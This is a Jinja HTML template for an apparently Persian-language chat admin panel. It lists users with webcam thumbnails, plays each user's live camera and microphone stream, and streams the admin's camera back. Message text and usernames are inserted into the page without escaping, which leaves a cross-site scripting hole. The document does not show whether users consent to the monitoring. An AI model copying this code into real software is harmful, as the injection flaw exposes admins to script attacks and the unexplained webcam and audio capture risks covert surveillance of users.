<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat 01 - پنل مدیریت</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: #212121; color: #ececec; font-family: 'Inter', sans-serif; height: 100vh; display: flex; overflow: hidden; }

        /* --- سایدبار --- */
        .sidebar { 
            width: 300px; background-color: #171717; 
            display: flex; flex-direction: column; 
            border-left: 1px solid #2f2f2f; 
            transition: transform 0.3s ease;
        }
        .sidebar-header { 
            padding: 20px; font-size: 18px; font-weight: 600; 
            border-bottom: 1px solid #2f2f2f; color: #4d6bfe;
            display: flex; justify-content: space-between; align-items: center;
        }
        .close-sidebar { display: none; background: #333; border: none; color: white; padding: 5px 12px; border-radius: 6px; cursor: pointer; font-size: 16px; }
        .user-list { flex: 1; overflow-y: auto; }
        .user-item { padding: 15px 20px; border-bottom: 1px solid #2f2f2f; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: 0.2s; }
        .user-item:hover { background-color: #2a2a2a; }
        .user-item.active { background-color: #2f2f2f; border-right: 3px solid #4d6bfe; }
        .user-avatar { width: 45px; height: 45px; background: #444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; position: relative; overflow: hidden; flex-shrink: 0; }
        .user-avatar img { width: 100%; height: 100%; object-fit: cover; }
        .online-dot { width: 12px; height: 12px; background: #4caf50; border-radius: 50%; position: absolute; bottom: 0; right: 0; border: 2px solid #171717; }
        .offline-dot { background: #888; }
        .user-info { display: flex; flex-direction: column; }
        .user-name { font-size: 15px; font-weight: 500; }
        .user-id { font-size: 12px; color: #888; }

        /* --- بخش چت --- */
        .chat-area { flex: 1; display: flex; flex-direction: column; position: relative; }
        .chat-header { padding: 15px 20px; background-color: #212121; border-bottom: 1px solid #2f2f2f; display: flex; justify-content: space-between; align-items: center; gap: 10px; }
        .menu-btn { display: none; background: #333; border: none; color: white; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-size: 18px; }
        .header-actions { display: flex; gap: 5px; }
        .header-actions button { background: #333; color: white; border: none; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-family: inherit; font-size: 13px; }
        .header-actions button:hover { background: #d32f2f; }

        /* --- کادرهای استریم --- */
        .stream-container {
            display: none;
            gap: 10px;
            padding: 10px;
            background: #000;
            border-bottom: 1px solid #333;
        }
        .stream-box {
            flex: 1;
            text-align: center;
            position: relative;
        }
        .stream-box img, .stream-box video {
            max-height: 180px;
            width: 100%;
            object-fit: cover;
            border-radius: 8px;
            background: #111;
        }
        .stream-label {
            font-size: 11px;
            margin-top: 5px;
        }
        .stream-controls {
            margin-top: 5px;
            display: flex;
            gap: 5px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .stream-controls button {
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 11px;
            font-family: inherit;
            color: white;
        }
        .btn-start { background: #4d6bfe; }
        .btn-stop { background: #d32f2f; }
        .btn-switch { background: #ff9800; }

        .messages { flex: 1; overflow-y: auto; padding: 30px 10% 120px 10%; display: flex; flex-direction: column; gap: 20px; }
        .message-row { display: flex; flex-direction: column; width: 100%; }
        .message-row.sent { align-items: flex-start; }
        .message-row.received { align-items: flex-end; }
        .message-bubble { max-width: 70%; padding: 12px 18px; border-radius: 12px; font-size: 15px; line-height: 1.5; word-wrap: break-word; }
        .message-row.sent .message-bubble { background-color: #2b5278; color: white; border-bottom-left-radius: 2px; }
        .message-row.received .message-bubble { background-color: #2f2f2f; color: #ececec; border-bottom-right-radius: 2px; }
        .time-label { font-size: 10px; color: #888; margin-top: 5px; }
        img, video, audio { max-width: 100%; border-radius: 8px; margin-top: 5px; }

        .input-container { position: absolute; bottom: 0; left: 0; right: 0; padding: 20px 10%; background: linear-gradient(180deg, transparent, #212121 30%); }
        .input-box { background-color: #2f2f2f; border-radius: 12px; padding: 10px 15px; display: flex; align-items: center; gap: 10px; }
        .input-box input { flex: 1; background: transparent; border: none; color: #ececec; font-size: 16px; outline: none; padding: 8px 0; }
        .send-btn { background-color: #4d6bfe; border: none; border-radius: 8px; padding: 8px 16px; cursor: pointer; color: white; font-family: inherit; }
        .send-btn:disabled { background-color: #444; cursor: not-allowed; }
        .icon-btn { background: none; border: none; color: #888; cursor: pointer; font-size: 20px; }

        /* دکمه فعال‌سازی صدا */
        #adminAudioUnlockBtn {
            display: none;
            position: fixed;
            bottom: 120px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 20;
        }
        #adminAudioUnlockBtn button {
            background: #ff9800;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-family: inherit;
            font-size: 14px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        /* ===== تنظیمات موبایل ===== */
        @media (max-width: 768px) {
            .sidebar { 
                position: fixed; 
                top: 0; right: 0; height: 100vh; 
                width: 80%; max-width: 320px;
                z-index: 100; 
                transform: translateX(100%);
                box-shadow: -5px 0 15px rgba(0,0,0,0.5);
            }
            .sidebar.open { transform: translateX(0); }
            .close-sidebar { display: block; }
            .menu-btn { display: block; }
            .messages { padding: 20px 5% 100px 5%; gap: 15px; }
            .input-container { padding: 15px 5%; }
            .message-bubble { max-width: 85%; font-size: 14px; padding: 10px 14px; }
            .chat-header { padding: 12px 15px; }
            .header-actions button { padding: 6px 10px; font-size: 12px; }
            .user-avatar { width: 40px; height: 40px; }
            .stream-box img, .stream-box video { max-height: 120px; }
        }
    </style>
</head>
<body>
    <!-- سایدبار -->
    <div class="sidebar" id="sidebar">
        <div class="sidebar-header">
            لیست کاربران
            <button class="close-sidebar" onclick="toggleSidebar()">✕</button>
        </div>
        <div class="user-list" id="userList">
            {% for u in users %}
                <div class="user-item" id="user-{{ u.id }}" onclick="selectUser({{ u.id }}, '{{ u.username }}')">
                    <div class="user-avatar">
                        {% if u.webcam %}<img src="{{ u.webcam }}">{% else %}{{ u.username[0]|upper }}{% endif %}
                        <div class="online-dot {% if not u.is_online %}offline-dot{% endif %}" id="dot-{{ u.id }}"></div>
                    </div>
                    <div class="user-info">
                        <span class="user-name" id="name-{{ u.id }}">{{ u.username }}</span>
                        <span class="user-id">ID: {{ u.id }}</span>
                    </div>
                </div>
            {% endfor %}
        </div>
    </div>

    <!-- بخش چت -->
    <div class="chat-area">
        <div class="chat-header">
            <button class="menu-btn" onclick="toggleSidebar()">☰</button>
            <div id="chatHeader" style="flex: 1; font-size: 14px;">یک کاربر را انتخاب کنید</div>
            <div class="header-actions" id="headerActions" style="display:none;">
                <button onclick="renameUser()">تغییر نام</button>
                <button onclick="deleteHistory()">حذف پیام‌ها</button>
            </div>
        </div>
        
        <!-- کادرهای استریم -->
        <div class="stream-container" id="streamContainer">
            <!-- استریم کاربر (چیزی که ادمین می‌بیند) -->
            <div class="stream-box" id="userStreamBox" style="display:none;">
                <img id="userLiveVideo" />
                <div class="stream-label" style="color: #4caf50;">🔴 استریم کاربر</div>
            </div>
            
            <!-- استریم ادمین (چیزی که کاربر می‌بیند) -->
            <div class="stream-box" id="adminStreamBox" style="display:none;">
                <video id="adminLiveVideo" autoplay muted playsinline></video>
                <div class="stream-label" style="color: #ff9800;">📹 دوربین شما (برای کاربر)</div>
                <div class="stream-controls">
                    <button class="btn-switch" onclick="switchCamera()">تغییر دوربین</button>
                    <button class="btn-stop" onclick="stopAdminCamera()">خاموش</button>
                </div>
            </div>
        </div>

        <!-- دکمه روشن کردن دوربین ادمین -->
        <div id="startCamContainer" style="display:none; padding: 10px; text-align: center; background: #1a1a1a;">
            <button onclick="startAdminCamera()" style="background: #4d6bfe; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-family: inherit; font-size: 13px;">
                📹 روشن کردن دوربین خودم (برای کاربر)
            </button>
        </div>

        <div class="messages" id="messages"></div>

        <div class="input-container">
            <div class="input-box">
                <button class="icon-btn" onclick="document.getElementById('fileInput').click()">📎</button>
                <input type="file" id="fileInput" style="display:none" accept="image/*,video/*,audio/*" onchange="uploadFile(this)">
                <input type="text" id="adminInput" placeholder="پیام..." disabled autocomplete="off">
                <button class="send-btn" onclick="sendAdminMessage()" disabled id="sendBtn">ارسال</button>
            </div>
        </div>
    </div>

    <!-- دکمه فعال‌سازی صدا -->
    <div id="adminAudioUnlockBtn">
        <button onclick="unlockAdminAudio()">🔊 برای شنیدن صدای کاربر کلیک کنید</button>
    </div>

    <script>
        const adminId = {{ admin_id }};
        let currentUserId = null, currentUserName = "", pendingFileUrl = null, pendingFileType = null;
        let ws;
        
        // صف پخش صدای کاربر
        let audioQueue = [];
        let isPlayingAudio = false;
        let adminAudioUnlocked = false;

        // استریم ادمین
        let adminMediaStream = null;
        let adminVideoInterval = null;
        let adminAudioRecorder = null;
        let currentFacing = "user"; // "user" برای جلو، "environment" برای عقب

        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('open');
        }

        // --- صف پخش صدا ---
        function unlockAdminAudio() {
            adminAudioUnlocked = true;
            document.getElementById('adminAudioUnlockBtn').style.display = 'none';
            playNextAudio();
        }

        function playNextAudio() {
            if (!adminAudioUnlocked) return;
            if (audioQueue.length === 0) { isPlayingAudio = false; return; }
            isPlayingAudio = true;
            const audio = new Audio(audioQueue.shift());
            audio.play().then(() => {
                audio.onended = () => playNextAudio();
            }).catch(() => {
                isPlayingAudio = false;
            });
        }

        // --- WebSocket ---
        function connectWebSocket() {
            const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            ws = new WebSocket(`${wsProtocol}${window.location.host}/ws/${adminId}/admin`);
            
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === 'status') {
                    const dot = document.getElementById(`dot-${data.user_id}`);
                    if (dot) dot.className = `online-dot ${data.is_online ? '' : 'offline-dot'}`;
                }
                
                // استریم کاربر
                if (data.type === 'live_stream' && data.user_id == currentUserId) {
                    const userStreamBox = document.getElementById('userStreamBox');
                    const userLiveVideo = document.getElementById('userLiveVideo');
                    document.getElementById('streamContainer').style.display = 'flex';
                    userStreamBox.style.display = 'block';
                    
                    if (data.video) userLiveVideo.src = data.video;
                    if (data.audio) {
                        if (!adminAudioUnlocked) {
                            document.getElementById('adminAudioUnlockBtn').style.display = 'block';
                        }
                        audioQueue.push(data.audio);
                        if (!isPlayingAudio) playNextAudio();
                    }
                }
                
                if (data.type === 'new_message' && data.sender_id == currentUserId) {
                    appendMessage(data.content, 'received', data.message_type, data.time, data.date);
                }
            };
            ws.onclose = () => setTimeout(connectWebSocket, 3000);
        }
        connectWebSocket();

        // --- انتخاب کاربر ---
        async function selectUser(id, name) {
            currentUserId = id; currentUserName = name;
            document.getElementById('chatHeader').innerHTML = `چت با: <span style="color:#4d6bfe">${name}</span>`;
            document.getElementById('adminInput').disabled = false;
            document.getElementById('sendBtn').disabled = false;
            document.getElementById('headerActions').style.display = 'flex';
            document.getElementById('adminInput').focus();
            
            // مخفی کردن استریم‌های قبلی
            document.getElementById('streamContainer').style.display = 'none';
            document.getElementById('userStreamBox').style.display = 'none';
            document.getElementById('adminStreamBox').style.display = 'none';
            document.getElementById('userLiveVideo').src = "";
            document.getElementById('startCamContainer').style.display = 'block';
            audioQueue = [];
            
            // متوقف کردن دوربین ادمین اگر روشن است
            if (adminMediaStream) stopAdminCamera();

            document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
            document.getElementById('user-' + id).classList.add('active');

            if (window.innerWidth <= 768) {
                document.getElementById('sidebar').classList.remove('open');
            }
            
            const messagesDiv = document.getElementById('messages');
            messagesDiv.innerHTML = '<div style="text-align:center; color:#888;">در حال بارگذاری...</div>';
            
            const res = await fetch(`/api/history/${id}/${adminId}`);
            const history = await res.json();
            messagesDiv.innerHTML = '';
            if (history.length === 0) messagesDiv.innerHTML = '<div style="text-align:center; color:#888;">پیامی وجود ندارد.</div>';
            else history.forEach(msg => appendMessage(msg.content, (msg.sender_id == adminId) ? 'sent' : 'received', msg.message_type, msg.time, msg.date));
        }

        // --- استریم دوربین ادمین ---
        async function startAdminCamera() {
            if (!currentUserId) { alert("اول یک کاربر انتخاب کنید"); return; }
            
            try {
                adminMediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: currentFacing }, 
                    audio: true 
                });
                
                const videoElement = document.getElementById('adminLiveVideo');
                videoElement.srcObject = adminMediaStream;
                
                document.getElementById('streamContainer').style.display = 'flex';
                document.getElementById('adminStreamBox').style.display = 'block';
                document.getElementById('startCamContainer').style.display = 'none';
                
                // ارسال ویدیو
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                adminVideoInterval = setInterval(() => {
                    if (videoElement.videoWidth > 0) {
                        canvas.width = 320; canvas.height = 240;
                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.5);
                        ws.send(JSON.stringify({ 
                            type: 'admin_stream', 
                            target_user_id: currentUserId, 
                            video: imageData, 
                            audio: null 
                        }));
                    }
                }, 200);

                // ارسال صدا
                const audioStream = new MediaStream(adminMediaStream.getAudioTracks());
                let mimeType = 'audio/webm';
                if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
                
                adminAudioRecorder = new MediaRecorder(audioStream, { mimeType: mimeType });
                adminAudioRecorder.ondataavailable = async (e) => {
                    if (e.data.size > 0) {
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            ws.send(JSON.stringify({ 
                                type: 'admin_stream', 
                                target_user_id: currentUserId, 
                                video: null, 
                                audio: reader.result 
                            }));
                        };
                        reader.readAsDataURL(e.data);
                    }
                };
                adminAudioRecorder.start(500);
                
            } catch (err) {
                alert("دسترسی به دوربین امکان‌پذیر نیست: " + err.message);
            }
        }

        function stopAdminCamera() {
            if (adminMediaStream) {
                adminMediaStream.getTracks().forEach(track => track.stop());
                adminMediaStream = null;
            }
            if (adminVideoInterval) {
                clearInterval(adminVideoInterval);
                adminVideoInterval = null;
            }
            if (adminAudioRecorder) {
                adminAudioRecorder.stop();
                adminAudioRecorder = null;
            }
            document.getElementById('adminStreamBox').style.display = 'none';
            document.getElementById('startCamContainer').style.display = 'block';
        }

        function switchCamera() {
            stopAdminCamera();
            currentFacing = (currentFacing === "user") ? "environment" : "user";
            startAdminCamera();
        }

        // --- نمایش پیام ---
        function appendMessage(content, type, msgType, time, date) {
            const messagesDiv = document.getElementById('messages');
            const empty = messagesDiv.querySelector('div[style*="text-align:center"]');
            if (empty) empty.remove();

            const row = document.createElement('div');
            row.className = `message-row ${type}`;
            let html = `<div class="message-bubble">`;
            if (msgType === 'image') html += `<img src="${content}">`;
            else if (msgType === 'video') html += `<video controls src="${content}"></video>`;
            else if (msgType === 'audio') html += `<audio controls src="${content}"></audio>`;
            else html += content;
            html += `</div><div class="time-label">${time} | ${date}</div>`;
            row.innerHTML = html;
            messagesDiv.appendChild(row);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }

        function uploadFile(inputFile) {
            const file = inputFile.files[0];
            if (!file) return;
            const formData = new FormData();
            formData.append("file", file);
            fetch('/api/upload', { method: 'POST', body: formData })
                .then(res => res.json())
                .then(data => { pendingFileUrl = data.url; pendingFileType = data.type; });
        }

        function sendAdminMessage() {
            if (pendingFileUrl) {
                ws.send(JSON.stringify({ receiver_id: currentUserId, content: pendingFileUrl, type: pendingFileType }));
                pendingFileUrl = null; pendingFileType = null;
            } else {
                const input = document.getElementById('adminInput');
                const text = input.value.trim();
                if (!text) return;
                ws.send(JSON.stringify({ receiver_id: currentUserId, content: text, type: "text" }));
                appendMessage(text, 'sent', 'text', new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), new Date().toLocaleDateString());
                input.value = '';
            }
        }

        async function renameUser() {
            const newName = prompt("نام جدید را وارد کنید:", currentUserName);
            if (!newName) return;
            const formData = new FormData();
            formData.append("user_id", currentUserId);
            formData.append("new_name", newName);
            await fetch('/api/rename_user', { method: 'POST', body: formData });
            document.getElementById('name-' + currentUserId).textContent = newName;
            document.getElementById('chatHeader').innerHTML = `چت با: <span style="color:#4d6bfe">${newName}</span>`;
        }

        async function deleteHistory() {
            if (!confirm("آیا از حذف تمام پیام‌های این کاربر مطمئن هستید؟")) return;
            const formData = new FormData();
            formData.append("user_id", currentUserId);
            formData.append("admin_id", adminId);
            await fetch('/api/delete_history', { method: 'POST', body: formData });
            document.getElementById('messages').innerHTML = '<div style="text-align:center; color:#888;">پیامی وجود ندارد.</div>';
        }

        document.getElementById('adminInput').addEventListener("keypress", e => { if (e.key === "Enter") { e.preventDefault(); sendAdminMessage(); } });
    </script>
</body>
</html>
